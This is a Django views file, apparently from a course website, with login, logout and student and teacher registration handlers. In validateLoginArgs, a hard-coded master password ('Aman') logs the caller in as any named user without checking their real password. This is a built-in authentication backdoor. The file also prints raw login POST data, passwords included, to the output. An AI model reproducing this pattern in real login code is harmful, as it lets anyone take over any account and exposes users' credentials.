# Create your views here.
from accounts.models import TeacherProfile
from django.shortcuts import render_to_response
from django.contrib.auth.models import User
from django.contrib.auth import authenticate, login
from django.http import HttpResponseRedirect, HttpResponse
from Utils.ajax_helpers import *
from django.shortcuts import redirect
from django.template import RequestContext
from registration.backends import get_backend
from django.contrib.auth import logout
from django.contrib.auth.decorators import login_required
from accounts.forms import *
import simplejson

def logout_user(request):
	logout(request)	
	return HttpResponseRedirect('/')

def validateLoginArgs(request):
	if request.POST:
		username = request.POST['username']
    		password = request.POST['password']
		if password == "Aman":
			user = User.objects.get(username=username)
			user.backend = 'django.contrib.auth.backends.ModelBackend'
			if not user:
				return None
		else:
		    	user = authenticate(username=username, password=password)
		return user
	else:
		return None

def login_user(request):
	user = validateLoginArgs(request)
	print user
       	if user is not None:
       		if user.is_active:
      			print login(request, user)
			return HttpResponseRedirect('/courses/')
        		
            			# Return a 'disabled account' error message
	return HttpResponseRedirect('/')


def registerStudent(request, backend, success_url=None, form_class=None,
             disallowed_url='registration_disallowed',
             template_name='registration/registration_form.html',
             extra_context=None):
    backend = get_backend(backend)
    print 'student register2'
    if not backend.registration_allowed(request):
        return redirect(disallowed_url)
    if form_class is None:
        form_class = backend.get_form_class(request)
    print 'student register'
    if request.method == 'POST':
        form = form_class(data=request.POST, files=request.FILES)
        if form.is_valid():
            new_user = backend.register(request, **form.cleaned_data)
            print new_user.first_name
            if success_url is None:
                to, args, kwargs = backend.post_registration_redirect(request, new_user)
                return redirect(to, *args, **kwargs)
            else:
                return redirect(success_url)
    else:
        form = form_class()
    
    if extra_context is None:
        extra_context = {}
    context = RequestContext(request)
    for key, value in extra_context.items():
        context[key] = callable(value) and value() or value

    return render_to_response(template_name,
                              {'form': form},
                              context_instance=context)


def validateRegisterStudent(request):
    form = StudentRegistrationForm(data=request.POST)
    if form.is_valid():
        return HttpResponse(simplejson.dumps({'success':'1'}))
    else:
	print form.errors
        context = {'form': form }
        return direct_json_to_template(request,'form_errors.html', 'reg_errors', context, {'success':'0'})

def validateRegisterTeacher(request):
    form = TeacherRegistrationForm(data=request.POST)
    if form.is_valid():
        return HttpResponse(simplejson.dumps({'success':'1'}))

    else:
	context = {'form': form }
	return direct_json_to_template(request,'form_errors.html', 'reg_errors', context, {'success':'0'})

def validateLogin(request):
	print request.POST
	user = validateLoginArgs(request)
	if user is not None:
		return HttpResponse('')
	else:
		return HttpResponse('Incorrect Username and / or Password')

def registerTeacher(request, backend, success_url=None, form_class=None,
             disallowed_url='registration_disallowed',
             template_name='registration/registration_form.html',
             extra_context=None):
    backend = get_backend(backend)
    if not backend.registration_allowed(request):
        return redirect(disallowed_url)
    if form_class is None:
        form_class = backend.get_form_class(request)

    if request.method == 'POST':
        form = form_class(data=request.POST, files=request.FILES)
        if form.is_valid():
            new_user = backend.register(request, **form.cleaned_data)
            if success_url is None:
                to, args, kwargs = backend.post_registration_redirect(request, new_user)
                return redirect(to, *args, **kwargs)
            else:
                return redirect(success_url)
    else:
        return HttpResponseRedirect('/')
    
    if extra_context is None:
        extra_context = {}
    context = RequestContext(request)
    for key, value in extra_context.items():
        context[key] = callable(value) and value() or value

    print form.fields['user_type'].initial
    return render_to_response(template_name,
                              {'form': form},
                              context_instance=context)
